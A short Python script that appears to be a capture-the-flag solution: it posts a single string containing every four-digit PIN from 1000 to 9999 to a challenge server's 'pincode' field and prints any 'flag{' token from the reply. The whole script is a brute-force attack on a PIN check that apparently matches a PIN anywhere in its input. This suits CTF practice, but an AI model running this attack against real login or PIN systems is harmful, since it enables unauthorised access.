import requests

url = 'http://pincode.challs.olicyber.it'

payload = ''

for i in range(1000, 10000):
    payload += f'{i:04}'

r = requests.post(url, data={'pincode': payload}).text
for i in r.split():
    if "flag{" in i.lower():
        print(i)
